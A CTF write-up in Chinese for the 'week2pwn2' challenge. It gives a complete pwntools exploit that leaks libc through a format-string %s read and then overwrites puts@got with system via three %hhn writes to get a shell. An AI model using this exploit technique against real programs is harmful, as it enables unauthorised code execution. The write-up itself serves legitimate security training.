# week2pwn2

## 题目简述

程序存在两次格式化字符串利用机会。第一次可通过 `%s` 从 `puts@got` 泄漏 libc 地址；第二次可用 `%hhn` 分三次改写 `puts@got` 的低 3 字节为 `system`，使后续 `puts("/bin/sh")` 变成 `system("/bin/sh")`。

## 解题过程

第一次 payload 的附加地址位于第 7 个参数，读取 GOT 项并计算 libc 基址。`puts` 和 `system` 位于同一 libc 映射，地址高位一致，因此只需覆盖低 3 字节。下面用模 256 的增量计算代替原题解中“字节必须递增，否则退出”的限制：

~~~python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
# s = process('./pwn2')
s = remote('HOST', PORT)
elf = ELF('./pwn2')
libc = ELF('./libc-2.31.so')
puts_got = elf.got['puts']

payload = b'aaaa%7$s' + p64(puts_got)
s.sendafter(b'do you want to say something?\n', payload)
s.recvuntil(b'aaaa')
libc_base = u64(s.recv(6).ljust(8, b'\x00')) - libc.sym['puts']
system = libc_base + libc.sym['system']
system_addr_low = system & 0xffffff
a = system_addr_low >> 16
b = (system_addr_low >> 8) & 0xff
c = system_addr_low & 0xff

def step(delta):
    return delta & 0xff or 0x100

payload = f'%{step(b)}c%13$hhn'.encode()
payload += f'%{step(a - b)}c%14$hhn'.encode()
payload += f'%{step(c - a)}c%15$hhn'.encode()
payload = payload.ljust(40, b'a')
payload += p64(puts_got + 1) + p64(puts_got + 2) + p64(puts_got)
s.sendafter(b'try to think deeper\n', payload)
s.interactive()
~~~

## 方法总结

- 核心方法：先用格式串任意读泄漏 libc，再用三个 `%hhn` 对 GOT 做低 3 字节部分覆盖。
- 识别特征：同一连接提供多次格式串输入，RELRO 未使 GOT 只读，且后续会以 `/bin/sh` 为参数调用 `puts`。
- 注意事项：原 PDF 中的 `ELF('./pwn14')` 是文件名笔误，应为 `pwn2`；格式化输出计数按模 256 计算，不能假设三个目标字节天然递增。
